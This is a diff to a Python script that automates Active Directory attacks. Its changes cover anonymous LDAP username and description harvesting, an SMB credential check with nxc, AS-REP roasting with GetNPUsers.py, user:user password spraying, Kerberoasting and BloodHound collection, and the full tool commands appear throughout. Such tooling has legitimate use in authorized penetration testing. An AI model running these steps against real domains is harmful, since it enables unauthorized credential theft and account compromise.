@@ -82,7 +82,45 @@ def run_command(cmd_list_or_str, title, is_shell_command=False, capture_output=F
     else:
         return None, result.returncode
 
-# NEW FUNCTION: Check Dependencies 
+
+def verify_credentials(r, username, password, timeout=20):
+    """
+    Lightweight SMB credential check. Returns True if creds look valid,
+    False otherwise. Prints a clear message explaining the result.
+    """
+    if not username or not password:
+        # Nothing to verify
+        return False
+
+    print_status("\n[*] Verifying provided credentials before continuing...")
+
+    # Use run_command so output is shown the same way your script does
+    # Capture output so we can inspect it
+    out, rc = run_command(["nxc", "smb", r, "-u", username, "-p", password, "--shares"],
+                          "Verify provided credentials",
+                          capture_output=True)
+
+    # If we see an explicit success marker, credentials are valid
+    if out and re.search(r'\[\+\]|Authenticated', out, re.IGNORECASE):
+        print_status(colored("\n[+] Credentials validated (SMB authentication succeeded). Continuing.", "green"))
+        return True
+
+    # If we see a clear logon failure, treat as invalid
+    if out and re.search(r'STATUS_LOGON_FAILURE', out, re.IGNORECASE):
+        print_status(colored("\n[-] Provided credentials failed SMB authentication (STATUS_LOGON_FAILURE).", "red"))
+        return False
+
+    # If the output is present but ambiguous, fail-safe: treat as invalid
+    if out and out.strip():
+        print_status(colored("\n[-] Credential verification returned ambiguous result; stopping.", "red"))
+        return False
+
+    # No output at all — treat as failure (tool might be flaky)
+    print_status(colored("\n[-] No output from credential verification — treating as failure and stopping.", "red"))
+    return False
+
+
+# Check Dependencies 
 def check_dependencies(is_kerberos=False):
     """Checks for necessary external tools and exits if missing."""
     print_status("\n[*] Checking external dependencies...")
@@ -125,6 +163,10 @@ def check_dependencies(is_kerberos=False):
         
     print_status("[+] All dependencies found.")
     return True
+
+
+
+
 
 def ensure_hosts_entry(ip, fqdn, domain):
     """
@@ -300,77 +342,80 @@ def update_users_file(new_unique, USERS_FILE, print_status_func):
             with open(USERS_FILE, "a", encoding="utf-8") as ef:
                 for ln in to_append:
                     ef.write(ln + "\n")
-            print_status_func(f"[+] Appended {len(to_append)} lowercase name(s) to {USERS_FILE}.")
+            print_status_func(f"[+] Appended lowercase name(s) to {USERS_FILE}.")
         else:
             print_status_func(f"[*] Lowercase entries already present in {USERS_FILE}. No changes made.")
             
     except Exception as e:
         print_status_func(f"[-] Error ensuring lowercase entries in {USERS_FILE}: {e}")
 
-
+def _mask_password_in_cmd(cmd_str, pwd):
+    """Return cmd_str with password occurrences masked for safe printing."""
+    if not pwd:
+        return cmd_str
+    return cmd_str.replace(pwd, "****")
 
 def section_1_ldap_discovery(r, u, p, k):
+    """
+    LDAP discovery that returns (discovered_domain, discovered_fqdn).
+    Runs the description extraction pipeline once and the username extraction once.
+    """
     print_header("1. LDAP Enumeration & Domain Discovery")
 
     discovered_domain = None
     discovered_fqdn = None
 
-    # Step 1: Query LDAP anonymously to discover domain info 
-    nxc_output, _ = run_command(
-        ["nxc", "ldap", r, "-u", "''", "-p", "''"],
-        "Get domain name via anonymous LDAP",
-        capture_output=True
-    )
+    # --- Step 1: Query LDAP anonymously to discover domain info ---
+    anon_user = ""   # empty string means anonymous
+    anon_pass = ""
+    nxc_list = ["nxc", "ldap", r, "-u", anon_user, "-p", anon_pass]
+    print_status(f"[*] Running anonymous LDAP check: $ {' '.join([a if a else '\"\"' for a in nxc_list])}")
 
-    if nxc_output:
+    nxc_output, _ = run_command(nxc_list, "Get domain name via anonymous LDAP", capture_output=True)
+
+    if nxc_output and nxc_output.strip():
+        print_status("[*] Received LDAP output (excerpt):")
+        for ln in nxc_output.splitlines()[:10]:
+            print_status(ln)
         match = re.search(r"\(name:(?P<name>[^)]+)\)\s*\(domain:(?P<domain>[^)]+)\)", nxc_output)
         if match:
             dc_name = match.group("name")
             discovered_domain = match.group("domain")
             discovered_fqdn = f"{dc_name}.{discovered_domain}"
+            print_status(f"[+] Parsed FQDN: {discovered_fqdn}")
             ensure_hosts_entry(r, discovered_fqdn, discovered_domain)
         else:
             print_status("[!] Could not parse FQDN/Domain information from LDAP output.")
     else:
-        print_status("[!] No LDAP response; skipping host mapping.")
+        print_status("[!] No LDAP response from anonymous query; skipping host mapping.")
 
-    # Step 2: Enumerate user descriptions and collect usernames 
-    # AWK with internal dedupe (one-line)
+    # --- Step 2: Enumerate user descriptions and collect usernames ---
     awk_script = r"""/description/{desc=substr($0,index($0,$6));valid=(desc!~/Built-in account for guest access to the computer\/domain/)} /sAMAccountName/&&valid{ if(!seen[$6]++){ printf "[+]Description: %-30s User: %s\n", desc, $6 } valid=0 }"""
 
-    ldap_user = u if u else "''"
-    ldap_pass = p if p else "''"
+    # Prepare shell-quoted creds for pipeline commands (use '""' when empty so the shell sees an empty string)
+    ldap_user_shell = shlex.quote(u) if u else '""'
+    ldap_pass_shell = shlex.quote(p) if p else '""'
     auth_type = "Authenticated" if u and p else "Anonymous"
 
-    # Enumerate with AWK (capture output)
-    ldap_desc_cmd = (
-        f"nxc ldap {r} -u {ldap_user} -p {ldap_pass} --query '(objectclass=user)' '' | "
-        f"awk '{awk_script}'"
-    )
-    output, _ = run_command(
-        ldap_desc_cmd,
-        f"Check for linked description/sAMAccountName ({auth_type})",
-        is_shell_command=True,
-        capture_output=True
-    )
+    # Description extraction pipeline (run once)
+    ldap_desc_cmd = f"nxc ldap {r} -u {ldap_user_shell} -p {ldap_pass_shell} --query '(objectclass=user)' '' | awk '{awk_script}'"
+    print_status("[*] Running LDAP description extraction (pipeline).")
 
-    if not output or not output.strip():
+    output_desc, _ = run_command(ldap_desc_cmd, f"Check for linked description/sAMAccountName ({auth_type})", is_shell_command=True, capture_output=True)
+
+    if not output_desc or not output_desc.strip():
         print_status("\n[*] No descriptions found in LDAP results.")
+    # else:
+    #     print_status("[*] LDAP description output (excerpt):")
+    #     for ln in output_desc.splitlines()[:10]:
+    #         print_status(ln)
 
-    # Gather usernames (sAMAccountName)
-    cmd_check_users = (
-        f"nxc ldap {r} -u {ldap_user} -p {ldap_pass} --query '(objectclass=user)' '' | "
-        "grep sAMAccountName | awk '{{print $6}}'"
-    )
-    output_users, _ = run_command(
-        cmd_check_users,
-        f"Check for sAMAccountName ({auth_type})",
-        is_shell_command=True,
-        capture_output=True
-    )
-    
+    # Username extraction pipeline (run once)
+    cmd_check_users = f"nxc ldap {r} -u {ldap_user_shell} -p {ldap_pass_shell} --query '(objectclass=user)' '' | grep sAMAccountName | awk '{{print $6}}'"
+    print_status("\n[*] Running LDAP username extraction.")
+    output_users, _ = run_command(cmd_check_users, f"Check for sAMAccountName ({auth_type})", is_shell_command=True, capture_output=True)
+
     if output_users and output_users.strip():
-        # Normalize & dedupe discovered usernames (preserve first-seen case)
         raw_names = [n.strip() for n in output_users.splitlines() if n.strip()]
         seen_new = set()
         new_unique = []
@@ -383,9 +428,13 @@ def section_1_ldap_discovery(r, u, p, k):
 
         print_status(f"[+] Found {len(new_unique)} unique usernames from LDAP.")
         update_users_file(new_unique, USERS_FILE, print_status)
+    else:
+        print_status("[*] No usernames discovered via LDAP username extraction.")
 
-        # ALWAYS return the discovered domain/FQDN tuple (may be None, None)
-        return discovered_domain, discovered_fqdn
+    # ALWAYS return the discovered domain/FQDN tuple (may be (None, None))
+    return discovered_domain, discovered_fqdn
+
+
 
 
 def section_2_smb_enum(r, f, d, u, p, k):
@@ -524,13 +573,32 @@ def section_3_user_spraying(r, d, u=None, p=None):
     """
     User Spraying (AS-REP Roasting)
     - If no credentials provided (u and p are both empty/None), run user:user spraying.
-    - If credentials provided, skip spraying but still run GetNPUsers.py if users.txt exists.
+    - If credentials provided, *verify them first*; only run GetNPUsers.py if creds validated.
     """
     print_header("3. User Spraying (AS-REP Roasting)")
 
-    # If credentials provided, skip spraying loops but still run AS-REP if possible
+    # If credentials provided, verify them first before running Kerberos-related tools
     if u and p:
-        print_status("\n[INFO] Credentials provided — skipping user:user spraying")
+        print_status("\n[INFO] Credentials provided — verifying credentials before Kerberos/AS-REP checks...")
+
+        # Run a lightweight SMB auth test (capture output)
+        verify_cmd = ["nxc", "smb", r, "-u", u, "-p", p, "--shares"]
+        out, _ = run_command(verify_cmd, "Verify provided credentials (light SMB check)", capture_output=True)
+
+        # If we saw an explicit SMB logon failure, skip Kerberos/AS-REP activity
+        if out and re.search(r'STATUS_LOGON_FAILURE', out, re.IGNORECASE):
+            print_status(colored("\n[-] Provided credentials appear invalid (STATUS_LOGON_FAILURE).", "red"))
+            print_status(colored("[-] Skipping GetNPUsers.py and Kerberos AS-REP checks due to invalid credentials.", "red"))
+            return
+
+        # If we see explicit success markers, proceed
+        if out and re.search(r'\[\+\]|Authenticated', out, re.IGNORECASE):
+            print_status(colored("\n[+] Credentials validated (SMB authentication succeeded). Proceeding with AS-REP checks.", "green"))
+        else:
+            # If output is empty or ambiguous, warn and proceed cautiously
+            print_status(colored("\n[!] Credential verification returned ambiguous/no output. Proceeding with AS-REP checks (you can disable by supplying no creds).", "yellow"))
+
+        # At this point: credentials seem OK (or user accepted risk) -> run GetNPUsers.py
         if os.path.exists(USERS_FILE):
             cmd_str = f"GetNPUsers.py {d}/ -no-pass -usersfile {USERS_FILE} -dc-ip {r} | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'"
             run_command(cmd_str, "Find users with Kerberos pre-auth disabled", is_shell_command=True)
@@ -544,14 +612,12 @@ def section_3_user_spraying(r, d, u=None, p=None):
         return
 
     # Run AS-REP roast check with GetNPUsers.py (preserve existing behavior)
-    if os.path.exists(USERS_FILE):
-        cmd_str = f"GetNPUsers.py {d}/ -no-pass -usersfile {USERS_FILE} -dc-ip {r} | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'"
-        run_command(cmd_str, "Find users with Kerberos pre-auth disabled", is_shell_command=True)
-    else:
-        print_status(f"\n[INFO] '{USERS_FILE}' not found - skipping AS-REP Roasting.")
+    cmd_str = f"GetNPUsers.py {d}/ -no-pass -usersfile {USERS_FILE} -dc-ip {r} | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'"
+    run_command(cmd_str, "Find users with Kerberos pre-auth disabled", is_shell_command=True)
 
-    # Try users in ofrom users.txt
+    # Try users in users.txt
     try_user_user_file(USERS_FILE, r, note="Attempt user:user")
+
 
 def section_4_kerberoasting(r, f, d, u, p, k):
     """Runs Kerberoasting and returns True if NTLM fails and Kerberos is needed."""
@@ -581,7 +647,7 @@ def section_5_bloodhound(r, f, d, u, p, k):
 
     kerberos_auth = ["-k"] if k else []
     
-    # NEW: Introduce a retry loop
+    # Introduce a retry loop
     max_retries = 2 # 1 initial attempt + 1 retry
     current_attempt = 1
     
@@ -686,6 +752,11 @@ def main():
 
     args.kerberos = False
 
+    if args.username and args.password:
+            ok = verify_credentials(args.rhosts, args.username, args.password)
+            if not ok:
+                print_status(colored("\n[-] Stopping: invalid credentials supplied. Fix credentials or rerun without them to continue anonymous checks.", "red"))
+                sys.exit(1)
     # Rerun Loop Setup 
     run_authenticated_checks = True
 
